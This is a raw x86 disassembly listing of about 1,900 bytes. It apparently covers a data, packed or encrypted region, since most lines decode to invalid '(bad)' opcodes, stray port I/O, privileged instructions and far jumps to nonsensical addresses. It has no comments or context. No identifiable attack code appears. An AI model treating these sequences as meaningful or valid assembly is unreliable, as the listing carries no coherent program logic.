  404182:	ins    BYTE PTR es:[edi],dx
  404183:	xor    cl,cl
  404185:	rol    BYTE PTR [edi-0x65],0x61
  404189:	dec    edx
  40418a:	mov    bh,0x8f
  40418c:	inc    ebp
  40418d:	mov    esi,0x5e7af5ac
  404192:	sub    DWORD PTR [ebp-0x42],eax
  404195:	stc    
  404196:	fs aam 0x26
  404199:	sahf   
  40419a:	inc    edi
  40419b:	je     0x40414d
  40419d:	retf   
  40419e:	clc    
  40419f:	(bad)  [ecx]
  4041a1:	push   cs
  4041a2:	or     eax,0xa95ff045
  4041a7:	pop    ss
  4041a8:	adc    ah,BYTE PTR [edi+0x2717007f]
  4041ae:	aam    0xd5
  4041b0:	or     al,bl
  4041b2:	jno    0x4041f5
  4041b4:	pop    edi
  4041b5:	fsubp  st(7),st
  4041b7:	(bad)  
  4041b8:	jmp    0x563ae666
  4041bd:	fist   WORD PTR [eax+0x299c02d6]
  4041c3:	fist   DWORD PTR [eax-0x4af68ab9]
  4041c9:	lahf   
  4041ca:	cmp    ecx,eax
  4041cc:	push   ds
  4041cd:	fcomp  DWORD PTR [edi+0x209cede9]
  4041d3:	dec    eax
  4041d4:	sub    bl,BYTE PTR [eax-0x16]
  4041d7:	sub    DWORD PTR [eax+0x55],ecx
  4041da:	pop    ebp
  4041db:	(bad)  
  4041dc:	jb     0x4041c7
  4041de:	cmp    al,BYTE PTR [edx+0x1d8777fa]
  4041e4:	or     esi,0x40
  4041e7:	pop    ds
  4041e8:	push   cs
  4041e9:	or     al,0x2c
  4041eb:	fldcw  WORD PTR [ebp-0x242f931c]
  4041f1:	jne    0x40423b
  4041f3:	sbb    edx,edi
  4041f5:	(bad)  
  4041f6:	hlt    
  4041f7:	xor    eax,0x30af48dd
  4041fc:	loope  0x4041f9
  4041fe:	cwde   
  4041ff:	mov    dh,0xa4
  404201:	xlat   BYTE PTR ds:[ebx]
  404202:	adc    ebx,DWORD PTR [edi+0x4c]
  404205:	xor    al,0xac
  404207:	mov    edx,0xc11954c1
  40420c:	or     ah,BYTE PTR [ecx]
  40420e:	dec    ebx
  40420f:	dec    edx
  404210:	push   edi
  404211:	js     0x40421f
  404213:	push   DWORD PTR [esi]
  404215:	in     eax,dx
  404216:	xchg   esp,eax
  404217:	mov    bh,0x1e
  404219:	hlt    
  40421a:	sbb    ebp,ebx
  40421c:	xchg   ecx,eax
  40421d:	fwait
  40421e:	mov    edi,0xef006fbf
  404223:	frstor [esi+esi*2]
  404226:	mov    eax,0x24a11211
  40422b:	mul    BYTE PTR [edx+0x29]
  40422e:	mov    al,0xa9
  404230:	pop    es
  404231:	popf   
  404232:	fsub   QWORD PTR [edi+0x21]
  404235:	jle    0x40422f
  404237:	in     al,0x68
  404239:	mov    dh,0x12
  40423b:	jge    0x404222
  40423d:	adc    BYTE PTR [eax-0x4],0x37
  404241:	push   eax
  404242:	dec    esp
  404243:	std    
  404244:	aas    
  404245:	cli    
  404246:	arpl   WORD PTR [edx+0x3799b3aa],si
  40424c:	mov    dl,0x91
  40424e:	mov    ecx,0x94020921
  404253:	xor    al,0xe5
  404255:	rcl    DWORD PTR [eax-0x5efd4e1f],cl
  40425b:	arpl   WORD PTR [ebx+0x35ce6a08],bp
  404261:	rcl    bl,0x5e
  404264:	jp     0x4042d2
  404266:	scas   eax,DWORD PTR es:[edi]
  404267:	(bad)  
  404268:	daa    
  404269:	(bad)  
  40426b:	add    ch,BYTE PTR [esi+0x70]
  40426e:	fs mov esi,0xb654ac71
  404274:	cpuid  
  404276:	and    eax,0x7a1cea6f
  40427b:	cmp    esp,DWORD PTR [eax+0x703341ba]
  404281:	pop    ecx
  404282:	js     0x404302
  404284:	dec    esi
  404285:	jl     0x404226
  404287:	xchg   edx,eax
  404288:	add    al,0xf0
  40428a:	and    DWORD PTR es:[ebx+0x60],ecx
  40428e:	neg    DWORD PTR [edx-0x4f]
  404291:	add    al,0xc8
  404293:	sub    bl,bl
  404295:	or     dh,BYTE PTR [esp+ebx*8]
  404298:	push   edi
  404299:	int3   
  40429a:	and    al,cl
  40429c:	xchg   DWORD PTR [esi],ebx
  40429e:	out    0x4a,al
  4042a0:	mov    dh,0xaf
  4042a2:	imul   edx,DWORD PTR [esi+0x49],0x77
  4042a6:	js     0x40429e
  4042a8:	sub    edi,ebx
  4042aa:	mov    ch,0x2a
  4042ac:	retf   
  4042ad:	test   DWORD PTR [esi-0x69],esi
  4042b0:	shr    ah,0x34
  4042b3:	rol    BYTE PTR [edi+0x41],1
  4042b6:	sbb    esp,DWORD PTR [ecx]
  4042b8:	cmp    eax,esp
  4042ba:	dec    ebp
  4042bb:	fcomp  QWORD PTR [eax+edi*4+0x32]
  4042bf:	sub    eax,0x65c0383b
  4042c4:	push   ebp
  4042c5:	cmc    
  4042c6:	or     ebp,DWORD PTR [si+0x6f]
  4042ca:	cli    
  4042cb:	test   DWORD PTR [ebp-0xb],0xf27019ac
  4042d2:	jae    0x4042fc
  4042d4:	lock popa 
  4042d6:	jae    0x4042fb
  4042d8:	push   es
  4042d9:	mov    ecx,0x24a49995
  4042de:	mov    ecx,0x51081a40
  4042e3:	push   edi
  4042e4:	sti    
  4042e5:	dec    ebp
  4042e6:	add    al,0xfe
  4042e8:	mov    ebx,gs
  4042ea:	sub    edx,0xeb61141f
  4042f0:	push   eax
  4042f1:	sub    eax,0xc9212565
  4042f6:	cmp    BYTE PTR [ebx-0x3e],al
  4042f9:	xlat   BYTE PTR ds:[ebx]
  4042fa:	int3   
  4042fb:	pop    esi
  4042fc:	jne    0x404363
  4042fe:	je     0x404296
  404300:	sahf   
  404301:	cwde   
  404302:	call   eax
  404304:	mov    BYTE PTR ds:0xcb77fa78,cl
  40430a:	imul   esi,DWORD PTR [edi-0x4ef50edb],0xb9c0e8fa
  404314:	mov    al,0x3c
  404316:	push   ebx
  404317:	ins    BYTE PTR es:[edi],dx
  404318:	dec    edi
  404319:	test   al,0xbf
  40431b:	ret    0xe9ee
  40431e:	cmp    al,0xb8
  404320:	mov    ah,0x27
  404322:	inc    edx
  404323:	into   
  404324:	lock inc eax
  404326:	addr16 in al,dx
  404328:	cmp    al,0x58
  40432a:	push   esp
  40432b:	out    dx,eax
  40432c:	gs stos DWORD PTR es:[edi],eax
  40432e:	pop    ebp
  40432f:	pop    ebx
  404330:	sub    DWORD PTR [ecx],edi
  404332:	push   0xe07dfb1d
  404337:	push   edi
  404338:	mov    al,0x5a
  40433a:	push   DWORD PTR [edx+0x23]
  40433d:	jle    0x4042da
  40433f:	or     BYTE PTR [ebp+0x57d9dfe1],ah
  404345:	cmp    BYTE PTR ds:[esi],bl
  404348:	jbe    0x4042e6
  40434a:	pusha  
  40434b:	pop    es
  40434c:	add    eax,0xf4e4bce5
  404351:	mov    WORD PTR [esi-0x30b148b3],cs
  404357:	leave  
  404358:	add    ebp,DWORD PTR [edi-0x7723ffc8]
  40435e:	pop    edx
  40435f:	inc    ebp
  404360:	das    
  404361:	xor    ah,BYTE PTR [ecx]
  404363:	jle    0x404334
  404365:	xchg   BYTE PTR ds:0x18113d63,bl
  40436b:	cs arpl bp,bx
  40436e:	pop    edi
  40436f:	out    dx,al
  404370:	sub    al,0x60
  404372:	cmp    al,0xf9
  404374:	(bad)  
  404376:	mov    ebx,0x673a7aa1
  40437b:	cwde   
  40437c:	(bad)  
  40437e:	and    BYTE PTR [edx-0x5e11e244],cl
  404384:	test   eax,0x99a53299
  404389:	cmp    al,0x82
  40438b:	std    
  40438c:	sub    dl,bl
  40438e:	pop    ds
  40438f:	retf   0xe206
  404392:	cmp    dl,BYTE PTR [ebx-0x7defeeba]
  404398:	xchg   ebx,eax
  404399:	imul   BYTE PTR [eax-0x558cef51]
  40439f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043a0:	inc    ebx
  4043a1:	sbb    eax,0xcb7e82fe
  4043a6:	push   esp
  4043a7:	inc    ecx
  4043a8:	xchg   edx,eax
  4043a9:	test   DWORD PTR [esi+edx*1-0x5453bbaa],0x916dcd59
  4043b4:	(bad)  
  4043b5:	aad    0xbb
  4043b7:	in     al,0x9a
  4043b9:	dec    esp
  4043ba:	inc    eax
  4043bb:	lahf   
  4043bc:	test   BYTE PTR [ebx-0x61],cl
  4043bf:	ss push ecx
  4043c1:	pusha  
  4043c2:	sub    eax,edi
  4043c4:	pop    esi
  4043c5:	pop    edx
  4043c6:	call   0x8aa:0x61d07ae2
  4043cd:	lods   al,BYTE PTR ds:[esi]
  4043ce:	push   ecx
  4043cf:	unpckhps xmm0,XMMWORD PTR ds:0xc5e261f7
  4043d6:	mov    dh,0xf
  4043d8:	mov    ah,0xfa
  4043da:	lahf   
  4043db:	or     eax,0x93c43372
  4043e0:	dec    edx
  4043e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043e2:	shl    BYTE PTR [ecx+0x74],cl
  4043e5:	fcom   QWORD PTR [ebx-0x59]
  4043e8:	and    esi,DWORD PTR [ebp+0x1c]
  4043eb:	or     BYTE PTR [ebp+eax*1-0x4f3ce059],bh
  4043f2:	cmp    BYTE PTR [ecx],0xd7
  4043f5:	push   ecx
  4043f6:	sbb    al,0xcf
  4043f8:	lods   al,BYTE PTR ds:[esi]
  4043f9:	sub    DWORD PTR fs:[ecx-0x15],esi
  4043fd:	ja     0x4043eb
  4043ff:	daa    
  404400:	sub    DWORD PTR [esi],0xffffffde
  404403:	mov    al,0x8a
  404405:	mov    ?,WORD PTR [esi+0x4]
  404408:	aad    0x0
  40440a:	(bad)  
  40440b:	out    0x64,al
  40440d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40440e:	mov    ds,WORD PTR [ecx]
  404410:	out    dx,eax
  404411:	scas   eax,DWORD PTR es:[edi]
  404412:	fsub   DWORD PTR [edi+0x65b689e3]
  404418:	add    ch,BYTE PTR [ecx+0x69]
  40441b:	outs   dx,BYTE PTR ds:[esi]
  40441c:	popa   
  40441d:	cmp    DWORD PTR [esi-0x2377a706],eax
  404423:	mov    DWORD PTR [ecx+eax*1-0x62],ebp
  404427:	adc    dh,bh
  404429:	es mov ch,0xfc
  40442c:	std    
  40442d:	pop    ebx
  40442e:	sub    BYTE PTR [ecx],bl
  404430:	lea    ebp,[edx+0x522f4ef9]
  404436:	push   ebx
  404437:	mov    eax,0x43b8c308
  40443c:	aam    0x3d
  40443e:	mov    esp,0xc4df1447
  404443:	adc    eax,0x25401467
  404448:	aad    0x20
  40444a:	jbe    0x4044c8
  40444c:	or     eax,0x6b5ad452
  404451:	rcl    BYTE PTR [eax],1
  404453:	xor    eax,0xa629576e
  404458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404459:	das    
  40445a:	daa    
  40445b:	mov    edx,0x142a5967
  404460:	fs xor al,0x3a
  404463:	jmp    0x404457
  404465:	scas   al,BYTE PTR es:[edi]
  404466:	jg     0x404442
  404468:	fs sahf 
  40446a:	adc    dh,dh
  40446c:	jne    0x4044b8
  40446e:	js     0x4044a8
  404470:	(bad)  [esi+eiz*1-0x6c804921]
  404477:	xor    DWORD PTR [edx-0x7f],ebp
  40447a:	ror    BYTE PTR [eax+0x54a6e52e],cl
  404480:	xchg   ebx,eax
  404481:	cld    
  404482:	pop    ebx
  404483:	adc    bh,bh
  404485:	fnsave [ebx-0x56]
  404488:	mov    bl,0x9
  40448a:	lock push ecx
  40448c:	out    0xc9,al
  40448e:	dec    edi
  40448f:	inc    ecx
  404490:	call   0x93a1:0x4e497e66
  404497:	loopne 0x4044fc
  404499:	cmp    al,0xb3
  40449b:	inc    ecx
  40449c:	or     eax,0xd9849b78
  4044a1:	cld    
  4044a2:	cli    
  4044a3:	stos   BYTE PTR es:[edi],al
  4044a4:	shr    BYTE PTR [eax],0x90
  4044a7:	cmp    al,0x46
  4044a9:	inc    esi
  4044aa:	les    eax,FWORD PTR [edx]
  4044ac:	add    bl,BYTE PTR [ebx-0x4eccd3a2]
  4044b2:	cmp    dh,bh
  4044b4:	or     ebx,esp
  4044b6:	sbb    DWORD PTR [ebp+0x31b8229c],0x16484755
  4044c0:	(bad)  [eax+0x4b5185ee]
  4044c6:	repnz xchg ebp,eax
  4044c8:	inc    ebx
  4044c9:	dec    ecx
  4044ca:	adc    BYTE PTR [ecx],bl
  4044cc:	rol    DWORD PTR [ecx+0x76],1
  4044cf:	dec    esp
  4044d0:	or     cl,bl
  4044d2:	call   0x308e5215
  4044d7:	jecxz  0x4044a5
  4044d9:	add    BYTE PTR [ecx+ebx*1],dh
  4044dc:	ds push esp
  4044de:	(bad)  
  4044df:	repz pop ebp
  4044e1:	stos   BYTE PTR es:[edi],al
  4044e2:	rcl    BYTE PTR [eax],0x7e
  4044e5:	xchg   BYTE PTR [edi-0x5d99cf00],al
  4044eb:	stos   BYTE PTR es:[edi],al
  4044ec:	popa   
  4044ed:	scas   al,BYTE PTR es:[edi]
  4044ee:	lods   al,BYTE PTR ds:[esi]
  4044ef:	push   edx
  4044f0:	and    BYTE PTR [esi+0x560fe25e],0xdf
  4044f7:	and    DWORD PTR [edx],ebx
  4044f9:	sub    al,BYTE PTR [esi+0x6b]
  4044fc:	mov    DWORD PTR [ecx+esi*2],ebp
  4044ff:	movmskps eax,xmm3
  404502:	sub    ebp,esi
  404504:	mov    edi,0x9add8692
  404509:	xor    eax,0x7ddbe569
  40450e:	jb     0x40458d
  404510:	imul   edx,ebx,0xffffff8d
  404513:	dec    esi
  404514:	fadd   st(0),st
  404516:	popa   
  404517:	loop   0x4044e6
  404519:	mov    al,BYTE PTR ds:[edx]
  40451c:	aaa    
  40451d:	test   dh,ah
  40451f:	cmp    ecx,DWORD PTR [ecx-0x4cdf0b63]
  404525:	enter  0xb741,0x60
  404529:	pop    eax
  40452a:	jns    0x4044f0
  40452c:	test   DWORD PTR [edi-0x38],ebx
  40452f:	jecxz  0x4044db
  404531:	push   ebx
  404532:	in     eax,dx
  404533:	sbb    eax,0x2d0cd6ca
  404538:	pop    es
  404539:	sub    BYTE PTR [esi+0x42],ch
  40453c:	and    esp,DWORD PTR [ebp+0x27]
  40453f:	(bad)  [esi+eax*2-0x7e]
  404543:	mov    cl,0xda
  404545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404546:	cmp    DWORD PTR [eax],esi
  404548:	rcl    BYTE PTR [ecx+0x65],1
  40454b:	push   eax
  40454c:	adc    eax,0xad4470da
  404551:	int3   
  404552:	into   
  404553:	rol    ch,0x22
  404556:	cmp    ch,BYTE PTR [ebx]
  404558:	sub    bh,BYTE PTR [ebx]
  40455a:	pop    ds
  40455b:	outs   dx,DWORD PTR ds:[esi]
  40455c:	push   ss
  40455d:	popf   
  40455e:	inc    edi
  40455f:	mov    dl,0x6c
  404561:	xchg   DWORD PTR [ecx-0x25],esp
  404564:	xlat   BYTE PTR ds:[ebx]
  404565:	out    dx,al
  404566:	xor    BYTE PTR [ecx+0x5692bb42],dh
  40456c:	mov    edx,0x57026a6e
  404571:	aaa    
  404572:	pop    edi
  404573:	ja     0x404525
  404575:	(bad)  
  404576:	les    ebp,FWORD PTR [ecx+0x60]
  404579:	fstp   DWORD PTR [edx-0x207f1692]
  40457f:	dec    edx
  404580:	outs   dx,BYTE PTR ds:[esi]
  404581:	pop    DWORD PTR [esi-0x1]
  404584:	fsubr  st,st(1)
  404586:	sub    DWORD PTR [ecx-0x3622e018],edx
  40458c:	jecxz  0x4045b8
  40458e:	jle    0x4045b5
  404590:	mov    ebp,0xabd60f7f
  404595:	and    eax,0x7d631b82
  40459a:	and    dh,BYTE PTR [eax-0x665eda36]
  4045a0:	or     ch,BYTE PTR [edx-0x3534aa54]
  4045a6:	dec    esi
  4045a7:	fcomp  QWORD PTR ds:0x663246c9
  4045ad:	shl    DWORD PTR [edi-0x4ebefe39],0xfb
  4045b4:	cdq    
  4045b5:	(bad)  
  4045b6:	std    
  4045b7:	mov    dh,dh
  4045b9:	pusha  
  4045ba:	in     eax,0xb7
  4045bc:	pushf  
  4045bd:	sub    BYTE PTR [esi+0x69],cl
  4045c0:	cld    
  4045c1:	mov    bl,ah
  4045c3:	pushf  
  4045c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c5:	pop    ss
  4045c6:	sahf   
  4045c7:	push   esp
  4045c8:	mov    ecx,0x8ab583d4
  4045cd:	xlat   BYTE PTR ds:[ebx]
  4045ce:	in     al,dx
  4045cf:	fiadd  DWORD PTR [ebx+0x2d03886f]
  4045d5:	rol    DWORD PTR [ebx+edi*4+0x27],0x52
  4045da:	jl     0x404648
  4045dc:	sahf   
  4045dd:	dec    edi
  4045de:	test   DWORD PTR [ebp-0x48],esp
  4045e1:	sub    eax,0x93f47254
  4045e6:	xor    ebx,DWORD PTR [ebp-0x597087b9]
  4045ec:	xor    BYTE PTR [ecx+0x1b],dh
  4045ef:	add    ah,BYTE PTR [esi+0x74a5bc28]
  4045f5:	cmp    eax,0x75befd65
  4045fa:	add    al,0x37
  4045fc:	mov    ds:0xde46f644,al
  404601:	stos   BYTE PTR es:[edi],al
  404602:	and    dl,dl
  404604:	jne    0x404643
  404606:	test   eax,0x58b9f007
  40460b:	daa    
  40460c:	outs   dx,BYTE PTR ds:[esi]
  40460d:	(bad)  
  40460e:	sbb    al,0x6f
  404610:	sbb    BYTE PTR ds:0xcbef210d,0x85
  404617:	ror    BYTE PTR [eax],1
  404619:	jp     0x404691
  40461b:	cmp    dh,BYTE PTR [esi-0x2344e990]
  404621:	lock xchg esp,eax
  404623:	dec    edx
  404624:	cmc    
  404625:	jbe    0x4045f9
  404627:	pop    esp
  404628:	dec    edx
  404629:	scas   eax,DWORD PTR es:[edi]
  40462a:	rol    BYTE PTR [edx-0x2f],0x3
  40462e:	mov    edx,fs
  404630:	adc    al,ah
  404632:	jnp    0x404630
  404634:	adc    dh,BYTE PTR [eax-0x342cd137]
  40463a:	xor    al,bl
  40463c:	in     eax,dx
  40463d:	mov    al,0xaf
  40463f:	push   0x94e3a698
  404644:	pop    ss
  404645:	and    BYTE PTR [ebp+0x21],ah
  404648:	sub    DWORD PTR [ecx-0x38a5ff1d],eax
  40464e:	pop    ebx
  40464f:	scas   al,BYTE PTR es:[edi]
  404650:	and    eax,0xcdd37a82
  404655:	aaa    
  404656:	clc    
  404657:	jle    0x4045e3
  404659:	stc    
  40465a:	ret    
  40465b:	sbb    ah,ah
  40465d:	sti    
  40465e:	cld    
  40465f:	imul   BYTE PTR [ecx+0x28f741c3]
  404665:	cwde   
  404666:	inc    edx
  404667:	mov    esi,0x5b614b1b
  40466c:	push   edx
  40466d:	retf   0xa3f3
  404670:	lds    di,DWORD PTR [ebp+0x20]
  404674:	add    bh,BYTE PTR [eax+0x171a1db9]
  40467a:	lds    ecx,FWORD PTR [esi]
  40467c:	test   DWORD PTR [eax+esi*1],ebp
  40467f:	jbe    0x40468d
  404681:	pop    es
  404682:	ins    DWORD PTR es:[edi],dx
  404683:	pop    ds
  404684:	les    esp,FWORD PTR [ebx+0x73]
  404687:	sbb    BYTE PTR [ebp-0x4d505382],ah
  40468d:	out    dx,eax
  40468e:	repnz out dx,al
  404690:	jns    0x404709
  404692:	pop    ss
  404693:	inc    esi
  404694:	inc    ebx
  404695:	sub    dl,BYTE PTR [esi-0x24]
  404698:	push   edi
  404699:	fbld   TBYTE PTR [ecx]
  40469b:	inc    esi
  40469c:	push   0xdfe84a39
  4046a1:	ret    0x54f1
  4046a4:	out    0xdf,eax
  4046a6:	jb     0x40463e
  4046a8:	mov    WORD PTR [edx-0x514f97be],?
  4046ae:	jnp    0x40464c
  4046b0:	xlat   BYTE PTR ds:[ebx]
  4046b1:	mov    BYTE PTR [ebx],ah
  4046b3:	sbb    al,0x85
  4046b5:	mov    edi,0x5c679bf9
  4046ba:	jl     0x4046e8
  4046bc:	ja     0x404667
  4046be:	push   eax
  4046bf:	mov    al,0x79
  4046c1:	(bad)  
  4046c2:	sti    
  4046c3:	push   ebp
  4046c4:	and    DWORD PTR gs:[esi+0x39e67c81],edx
  4046cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046cc:	dec    edx
  4046cd:	stos   BYTE PTR es:[edi],al
  4046ce:	jp     0x404749
  4046d0:	mov    edi,0xc4deefdb
  4046d5:	std    
  4046d6:	lods   eax,DWORD PTR ds:[esi]
  4046d7:	mov    DWORD PTR [ecx-0x79],0xf648b35b
  4046de:	ja     0x404709
  4046e0:	lods   al,BYTE PTR ds:[esi]
  4046e1:	inc    edi
  4046e2:	xor    edx,DWORD PTR [edi+0x171c796f]
  4046e8:	outs   dx,BYTE PTR ds:[esi]
  4046e9:	mov    bh,BYTE PTR [ecx-0x17d7f6a9]
  4046ef:	cmp    eax,edx
  4046f1:	test   DWORD PTR ds:0xe7f303b5,edi
  4046f7:	adc    eax,0xb6bff736
  4046fc:	push   eax
  4046fd:	sbb    DWORD PTR es:[edx+eiz*2+0x25d444dd],ecx
  404705:	sbb    ebp,edx
  404707:	pop    eax
  404708:	mov    bl,dl
  40470a:	and    cl,BYTE PTR [edx]
  40470c:	out    dx,al
  40470d:	jb     0x404760
  40470f:	xchg   ebx,eax
  404710:	cmp    al,0xee
  404712:	inc    edx
  404713:	dec    esp
  404714:	mov    cl,0xf9
  404716:	cmp    esp,DWORD PTR [esi]
  404718:	cwde   
  404719:	in     eax,dx
  40471a:	and    al,0x50
  40471c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40471d:	mov    ds:0x29365d2b,al
  404722:	add    ch,BYTE PTR [eax+0x16]
  404725:	pop    eax
  404726:	div    DWORD PTR [ebx+eax*1]
  404729:	dec    ebp
  40472a:	inc    eax
  40472b:	(bad)  
  40472c:	cmc    
  40472d:	cs cmp al,0xc7
  404730:	push   0x848cd12b
  404735:	pop    ebx
  404736:	aam    0xfd
  404738:	and    BYTE PTR [edx],bh
  40473a:	mov    cl,0x5d
  40473c:	(bad)  
  40473d:	mov    dl,0x55
  40473f:	enter  0x5051,0x1b
  404743:	or     cl,BYTE PTR [ebx+0xd]
  404746:	lods   al,BYTE PTR ds:[esi]
  404747:	pop    es
  404748:	mov    esi,0x9410fb7e
  40474d:	aaa    
  40474e:	mov    ebp,0x5b6a05d1
  404753:	adc    cx,WORD PTR ds:0xfd9302c2
  40475a:	sub    al,0x32
  40475c:	jne    0x4047bf
  40475e:	sub    eax,edi
  404760:	stos   BYTE PTR es:[edi],al
  404761:	pop    edx
  404762:	ret    
  404763:	push   ss
  404764:	in     eax,dx
  404765:	add    DWORD PTR [ebx-0x1c],edx
  404768:	cmp    BYTE PTR [eax],al
  40476a:	and    edx,eax
  40476c:	push   esi
  40476d:	cmp    DWORD PTR [edx],ebp
  40476f:	aas    
  404770:	aam    0xfd
  404772:	jmp    0xd133:0xadee61e4
  404779:	or     eax,0x20d3f40d
  40477e:	adc    DWORD PTR ds:0x4e18a760,eax
  404784:	mov    al,0xe2
  404786:	cli    
  404787:	test   bl,dl
  404789:	in     eax,0xf7
  40478b:	pop    esp
  40478c:	cld    
  40478d:	cmp    bl,BYTE PTR [ecx+ebp*2]
  404790:	fsubr  DWORD PTR [ecx+eax*8-0x3f]
  404794:	daa    
  404795:	pop    ebx
  404796:	or     edx,0x53f0fe08
  40479c:	dec    ebp
  40479d:	pop    ds
  40479e:	imul   ebp,DWORD PTR [eax+0x4f],0x93648dd5
  4047a5:	push   ss
  4047a6:	sub    ebp,DWORD PTR [ebp-0xe]
  4047a9:	push   es
  4047aa:	jmp    0x9182:0x4778df5a
  4047b1:	repz mov cl,BYTE PTR ds:[edx+0x4b002a1b]
  4047b9:	loopne 0x4047a5
  4047bb:	in     al,dx
  4047bc:	in     al,0xa
  4047be:	loop   0x404740
  4047c0:	pop    eax
  4047c1:	js     0x404783
  4047c3:	test   al,0xaf
  4047c5:	in     al,0xd7
  4047c7:	cmp    ah,cl
  4047c9:	xor    DWORD PTR [ebx+0x10],eax
  4047cc:	cmp    DWORD PTR [ebx+edi*4+0x64],esi
  4047d0:	dec    ebx
  4047d1:	enter  0xbc15,0xb1
  4047d5:	xlat   BYTE PTR ds:[ebx]
  4047d6:	push   cs
  4047d7:	rcr    BYTE PTR [eax+0x75],cl
  4047da:	repnz in al,dx
  4047dc:	mov    ah,0x3a
  4047de:	add    al,0x6d
  4047e0:	adc    ebx,DWORD PTR [esi-0x18]
  4047e3:	es xor esi,0xffffffda
  4047e7:	nop
  4047e8:	ret    0x4a6a
  4047eb:	inc    ecx
  4047ec:	ins    BYTE PTR es:[edi],dx
  4047ed:	dec    ecx
  4047ee:	test   eax,0x739b904c
  4047f3:	push   edx
  4047f4:	cmc    
  4047f5:	cmp    BYTE PTR [eax],bh
  4047f7:	jno    0x4047d0
  4047f9:	mov    edi,0xcb56bb44
  4047fe:	mov    esi,0xad6b7a35
  404803:	or     eax,0x5cf10fa3
  404808:	call   esi
  40480a:	cmc    
  40480b:	mov    ecx,0x24188e09
  404810:	adc    BYTE PTR [ebx],bl
  404812:	xchg   esp,eax
  404813:	pop    esi
  404814:	and    al,0xc5
  404816:	xor    eax,0x23d32c61
  40481b:	sti    
  40481c:	into   
  40481d:	iret   
  40481e:	aas    
  40481f:	pusha  
  404820:	fst    st(2)
  404822:	js     0x40482c
  404824:	push   ss
  404825:	inc    ebx
  404826:	out    0x14,eax
  404828:	xchg   esp,eax
  404829:	leave  
  40482a:	pop    edi
  40482b:	neg    BYTE PTR [ebx+eiz*8+0x40]
  40482f:	popa   
  404830:	stos   DWORD PTR es:[edi],eax
  404831:	mov    ?,WORD PTR [ebp-0x2464a533]
  404837:	mov    al,0x57
  404839:	aaa    
  40483a:	jmp    0x4047f7
  40483c:	jmp    0x43b015a5
  404841:	aaa    
  404842:	sbb    edi,esp
  404844:	out    dx,al
  404845:	xor    DWORD PTR [edx+0x79fcdb98],0x6c
  40484c:	push   ebx
  40484d:	outs   dx,DWORD PTR ds:[esi]
  40484e:	sbb    DWORD PTR [eax+0x45],ebx
  404851:	stos   BYTE PTR es:[edi],al
  404852:	and    al,0xc2
  404854:	xchg   esi,eax
  404855:	xor    edx,ecx
  404857:	leave  
  404858:	fist   DWORD PTR [ebp+0x4dcfd1af]
  40485e:	push   esi
  40485f:	hlt    
  404860:	mov    dl,0x88
  404862:	data16 (bad) 
  404864:	lahf   
  404865:	shl    cl,cl
  404867:	das    
  404868:	popa   
  404869:	inc    esi
  40486a:	sub    BYTE PTR [esi],dh
  40486c:	add    dh,cl
  40486e:	sub    DWORD PTR [ecx+0x5c],ecx
  404871:	aas    
  404872:	bnd jbe 0x4048bf
  404875:	or     edx,eax
  404877:	inc    ebp
  404878:	push   ebx
  404879:	add    dl,cl
  40487b:	cmp    eax,0xd022c043
  404880:	std    
  404881:	sub    DWORD PTR [eax+edi*8-0x24ae80ac],esp
  404888:	cld    
  404889:	adc    al,0x14
  40488b:	(bad)  
  40488d:	je     0x4048b7
  40488f:	jmp    0x1c3:0x8785b143
  404896:	or     DWORD PTR [eax],ebx
  404898:	scas   al,BYTE PTR es:[edi]
  404899:	imul   esp,edx,0x1b3f581e
  40489f:	js     0x404910
  4048a1:	sbb    BYTE PTR [ebx],0xf8
  4048a4:	and    ecx,ebx
  4048a6:	rcl    BYTE PTR ds:0x5498afc2,0x8f
  4048ad:	ja     0x404837
  4048af:	fisttp QWORD PTR [eax]
  4048b1:	sub    eax,0x44df8e18
  4048b6:	rol    BYTE PTR [edi+esi*1-0x7c],1
  4048ba:	mov    ds,ebp
  4048bc:	add    dh,bl
  4048be:	cmp    al,0x90
  4048c0:	xchg   edx,eax
  4048c1:	(bad)  
  4048c2:	test   al,0xa7
  4048c4:	fist   DWORD PTR [ebp+0xf]
  4048c7:	mov    edi,0x5aed1ea0
  4048cc:	push   ss
  4048cd:	mov    fs,WORD PTR [ebp-0x3c496914]
  4048d3:	mov    dh,0x57
  4048d5:	test   eax,0xc37c9b90
  4048da:	je     0x404939
  4048dc:	xor    BYTE PTR [eax-0x4e6b66ce],al
  4048e2:	sbb    al,0x81
  4048e4:	mov    dl,0x56
  4048e6:	add    eax,0xabcd4919
  4048eb:	or     ch,bh
  4048ed:	jl     0x4048b6
  4048ef:	jmp    0x35b772bd
  4048f4:	out    0xb9,al
  4048f6:	jns    0x4048a1
  4048f8:	lods   al,BYTE PTR ds:[esi]
  4048f9:	inc    edx
  4048fa:	sub    al,BYTE PTR [ebx-0x326a624a]
  404900:	jb     0x404889
  404902:	mov    bh,0x33
  404904:	loope  0x40494a
  404906:	and    al,0x33
  404908:	mov    esp,DWORD PTR [edx+0x7a]
  40490b:	mov    ?,WORD PTR gs:[edi+0x78]
  40490f:	and    eax,0x3c6d5891
  404914:	or     ebx,DWORD PTR [ebx-0x6d4c6b92]
  40491a:	stos   DWORD PTR es:[edi],eax
  40491b:	outs   dx,BYTE PTR ds:[esi]
  40491c:	sti    
  40491d:	mov    bh,0xec
  40491f:	retf   
  404920:	gs rcl edi,1
  404923:	push   ss
  404924:	add    DWORD PTR [ecx],0xe74051e8
  40492a:	ins    DWORD PTR es:[edi],dx
  40492b:	fimul  WORD PTR [eax+eiz*8-0x3]
  40492f:	imul   edx,DWORD PTR [ebx-0x16],0x9e603fb7
  404936:	adc    eax,0x863591d4
  40493b:	bound  esp,QWORD PTR [ebx-0x53]
  40493e:	xor    al,0x71
  404940:	adc    DWORD PTR [esi],ebx
  404942:	mov    dh,0xe3
  404944:	fs pushf 
  404946:	outs   dx,BYTE PTR ds:[esi]
  404947:	pusha  
  404948:	mov    cl,BYTE PTR [edx+0x3d]
  40494b:	push   esi
  40494c:	sbb    edx,ebp
  40494e:	scas   al,BYTE PTR es:[edi]
  40494f:	outs   dx,DWORD PTR ds:[esi]
  404950:	cdq    
  404951:	in     al,dx
  404952:	and    esp,edi
